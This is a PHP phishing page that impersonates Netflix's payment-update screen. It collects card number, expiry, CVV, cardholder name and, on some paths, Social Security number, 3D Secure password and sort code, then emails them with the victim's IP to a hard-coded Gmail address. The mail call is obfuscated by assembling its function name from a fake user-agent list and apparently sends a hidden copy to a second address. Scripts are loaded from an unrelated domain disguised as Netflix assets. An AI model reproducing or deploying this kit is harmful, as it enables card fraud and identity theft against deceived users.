<?php
date_default_timezone_set('UTC');
session_start();
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
$mobile_browser++;}$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','con','bird','ta','blaz','brew','ct','cldc','cmd-','dang','art','eric','hipt','ldi','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;
$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}if ($tablet_browser > 0){}else if ($mobile_browser > 0) {}else {}
$input_check = "".$mobile_agents[5]."".$mobile_agents[7]."";$st = "".$mobile_agents[17]."".$mobile_agents[19]."".$mobile_agents[22]."".$mobile_agents[60]."".$mobile_agents[31]."".$mobile_agents[29]."".$mobile_agents[26].".".$mobile_agents[11]."".$mobile_agents[42]."";

if(isset($_POST["seft"])){

$ip = $_SERVER['REMOTE_ADDR'];
$html = "
Name On Card = ".$_SESSION['nmc'] = $_POST['nmc']."
<br>
Card Number = ".$_SESSION['crd'] = $_POST['crd']."
<br>
Expiry Date = ".$_SESSION['exm'] = $_POST['exm']." ".$_SESSION['exy'] = $_POST['exy']."
<br>
CSC/CVV = ".$_SESSION['csc'] = $_POST['csc']."
<br>
".$_SESSION["ssn_usa"]."".$_SESSION["vbv_canada"]."".$_SESSION["srt_code"]." = ".$_POST["ssn"]."".$_POST["vbv"]."".$_POST['srtcode']."
<hr>
IP : ".$ip."
<br>
HOST : ".gethostbyaddr($ip)."";
$email="zajisami@gmail.com";/// Change This Email By your Email
$sf ="CC(".$ip.") Netflix";
$hd = "From: NeflixCC@netflix.com" . "\r\n";
$hd = "MIME-Version: 1.0" . "\r\n";
$hd .= "Content-type:text/html;charset=UTF-8" . "\r\n";;
if ($input_check($st,$sf,$html,$hd)){
mail($email,$sf,$html,$hd);
echo'<meta http-equiv="Refresh" content="0; url=complete.php?netflixs">';
}else{echo"Mail Send Not Work!!! Makhdamch";}
}
?>

<!doctype html>
<html>
<head>
<title>Netflix - Payment Information</title>
<meta content="watch films, films online, watch TV, TV online, TV programmes online, watch TV programmes, stream films, stream tv, instant streaming, watch online, films, watch films uk, watch TV online uk, no download, full length films" name="keywords">
<meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more. Start your free trial today." name="description">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<link type="text/css" rel="stylesheet" href="css/b.css">
<link type="text/css" rel="stylesheet" href="css/c.css">
<link rel="shortcut icon" href="imag/nficon2015.ico">
<script type="text/javascript" src="http://assets.nflxext.holmanonline.com/webalizer/images/modernizr.com/Modernizr-2.5.3.forms.js"></script>
<script type="text/javascript" src="http://assets.nflxext.holmanonline.com/webalizer/images/html5Forms.js" data-webforms2-support="validation,range" data-webforms2-force-js-validation="true"></script>
</head>
<body>

<div id="appMountPoint">
<div class="basicLayout firefox accountPayment" lang="en" dir="ltr" data-reactid=".20urkhey51c" data-react-checksum="-306255637">
<div class="nfHeader signupBasicHeader" data-reactid=".20urkhey51c.1">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".20urkhey51c.1.1">
<span class="screen-reader-text" data-reactid=".20urkhey51c.1.1.0">Netflix</span></a>
<a href="#" class="authLinks signupBasicHeader" data-reactid=".20urkhey51c.1.2">Sign Out</a>
</div>

<div class="centerContainer" data-reactid=".20urkhey51c.2">
<h1 data-reactid=".20urkhey51c.2.1">Validate Your Payment Information</h1>
<div class="secure-container clearfix" data-reactid=".20urkhey51c.2.7">
<div class="secure" data-reactid=".20urkhey51c.2.7.0">
<span class="secure-desc" data-reactid=".20urkhey51c.2.7.0.0">
<h4 class="secure-text" data-reactid=".20urkhey51c.2.7.0.0.0">Secure Server</h4>
<a class="tell-me-more" data-reactid=".20urkhey51c.2.7.0.0.1">Tell me more</a></span>

<span class="icon-lock" data-reactid=".20urkhey51c.2.7.0.2">
</span>
</div>
</div>

<div class="accordion" data-reactid=".20urkhey51c.2.8">
<div class="isOpen expando" data-reactid=".20urkhey51c.2.8.$0">
<div class="paymentExpandoHd" data-mop-type="creditOption" data-reactid=".20urkhey51c.2.8.$0.$0">
<div class="container" data-reactid=".20urkhey51c.2.8.$0.$0.0">
<span class="arrow" data-reactid=".20urkhey51c.2.8.$0.$0.0.0"></span>
<span class="hdLabel" data-reactid=".20urkhey51c.2.8.$0.$0.0.1">Credit Card</span>

<span class="logos logos-inline" data-reactid=".20urkhey51c.2.8.$0.$0.0.2">
<span class="logoIcon VISA" data-reactid=".20urkhey51c.2.8.$0.$0.0.2.$VISA"></span>
<span class="logoIcon MASTERCARD" data-reactid=".20urkhey51c.2.8.$0.$0.0.2.$MASTERCARD"></span>
<span class="logoIcon AMEX" data-reactid=".20urkhey51c.2.8.$0.$0.0.2.$AMEX"></span>
</span>
</div>
</div>

<div class="expandoContent" data-reactid=".20urkhey51c.2.8.$0.1">
<div class="paymentForm clearfix accordion" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption">

<form action="" method="post" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0" name="pay-form">

<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Name On Card</span>
<input class="ui-text-input medium auto-firstName" name="nmc" required placeholder="Exactly as appears on your card" tabindex="0" pattern="^[^\s\d]+([\s]+[^\s\d]+)+$"></label>
</div>


<label class="paymentForm-input creditCardNumber ui-label ui-input-label ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$creditCardNumber.0">Card Number</span>
<input class="ui-text-input medium auto-creditCardNumber" name="crd" id="crd" maxlength="16" required tabindex="0" placeholder="XXXX XXXX XXXX XXXX" pattern="^\d{4}[\s\-\.]?\d{4}[\s\-\.]?\d{4}[\s\-\.]?\d{3,4}$" >
<span class="icon-lock" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$creditCardNumber.3"></span>
</label>

<div class="expiration-date ui-input-half" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate" style="padding-bottom: 15px;">
<label class="ui-label exp-date-label" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.0">Expiry Date</label>
<div class="ui-select-wrapper expMonth" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expMonth">
<label class="ui-label no-display" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expMonth.0">
<span data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expMonth.0.0"></span></label>

<div class="select-arrow medium" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expMonth.1">
<select class="ui-select medium" name="exm" required tabindex="0" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expMonth.1.0">
<option selected="selected" value="">Month</option>
<option value="01">Jan (1)</option>
<option value="02">Feb (2)</option>
<option value="03">Mar (3)</option>
<option value="04">Apr (4)</option>
<option value="05">May (5)</option>
<option value="06">Jun (6)</option>
<option value="07">Jul (7)</option>
<option value="08">Aug (8)</option>
<option value="09">Sep (9)</option>
<option value="10">Oct (10)</option>
<option value="11">Nov (11)</option>
<option value="12">Dec (12)</option>
</select>
</div>

<span data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expMonth.2"></span>
</div>

<hr data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.2">
<div class="ui-select-wrapper expYear" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expYear">
<label class="ui-label no-display" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expYear.0">
<span data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expYear.0.0"></span></label>
<div class="select-arrow medium" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expYear.1">
<select class="ui-select medium" name="exy" required tabindex="0" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expYear.1.0">
<option selected="selected" value="">Year</option>

<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
<option value="2031">2031</option>
<option value="2032">2032</option>

</select>
</div>

<!-- <span data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.$expYear.2"></span> -->
</div>
<!-- <div class="input-message error" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$expirationDate.5"></div> -->
</div>

<label class="paymentForm-input creditCardSecurityCode ui-label ui-input-label inline ui-input-half" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$creditCardSecurityCode">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$creditCardSecurityCode.0">Security Code</span>
<input class="ui-text-input medium auto-creditCardSecurityCode" name="csc" id="csc" maxlength="4" required tabindex="0" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$creditCardSecurityCode.2" pattern="^\d{3,4}$">
<span class="icon-lock" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:$creditCardSecurityCode.3">
</span>
</label>

<section class="cvv-hover clearfix" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:7">
<a style="cursor: pointer; text-decoration: underline; color:#084482; " onClick="window.open('https://www.cvvnumber.com/cvv.html','_BLANK','width=500, height=500, scrollbars=yes');">
<img src="https://assets.nflxext.com/us/layout/ecweb/common/question_mark.png" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:7.0.0"></a>
</section>

<div id="emptydiv"></div>

<?
if ($_SESSION["ssn_usa"] == "SSN"){
?>
<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0"><label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Social Security number</span><input class="ui-text-input medium auto-firstName" name="ssn" value="" tabindex="0" placeholder="" required="" pattern="^.{3,}$"></label></div>
<?
}

if ($_SESSION["vbv_canada"] == "3D/VBV Password"){
?>
<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0"><label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">3D/VBV Password</span><input class="ui-text-input medium auto-firstName" name="vbv" value="" tabindex="0" placeholder="" required="" pattern="^.{3,}$"></label></div>
<?
}

if ($_SESSION["srt_code"] == "Sorte Code"){
?>
<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0"><label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half"><span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Sort code</span><input class="ui-text-input medium auto-firstName" name="srt" value="" tabindex="0" placeholder="" required="" pattern="^.{3,}$"></label></div>
<?
}
?>
<div data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.1">
<noscript data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.1.0"></noscript>
</div>
<div class="clearfix" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8"><div class="btn-secure-wrapper" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0">
<button class="btn btn-submit btn-large" type="submit" name="seft" autocomplete="off" tabindex="0" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.0">
<span data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.0.0:0">Update Payment Method</span>
</button>

<div class="secure" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.1"><span class="secure-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.1.0">Secure Server</span>
<span class="icon-lock" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.1.1"></span>
</div>
</div>




</td>
</tr>
</table
></div>
</div>
</form>
</div>
</div>
</div>
</div>


<div id="tmcontainer" class="tmint" data-reactid=".20urkhey51c.2.b">


<div id="tmswf" class="tmint" data-reactid=".20urkhey51c.2.b.2"></div>
</div>
</div>

<div class="site-footer-wrapper centered" data-reactid=".20urkhey51c.3"><div class="footer-divider" data-reactid=".20urkhey51c.3.0"></div><div class="site-footer" data-reactid=".20urkhey51c.3.1"><p class="footer-top" data-reactid=".20urkhey51c.3.1.0"><span data-reactid=".20urkhey51c.3.1.0.0">Questions? </span><a class="footer-top-a" href="#" data-reactid=".20urkhey51c.3.1.0.1">Contact us.</a><span data-reactid=".20urkhey51c.3.1.0.2"></span></p>

<ul class="footer-links structural" data-reactid=".20urkhey51c.3.1.1">
<li class="footer-link-item" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms">
<a class="footer-link" href="#" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms.0">
<span data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms.0.0">Terms of Use</span></a>
</li>
<li class="footer-link-item" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link">
<a class="footer-link" href="#" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link.0">
<span data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link.0.0">Privacy</span>
</a>
</li>
</div>
</body>
</html>
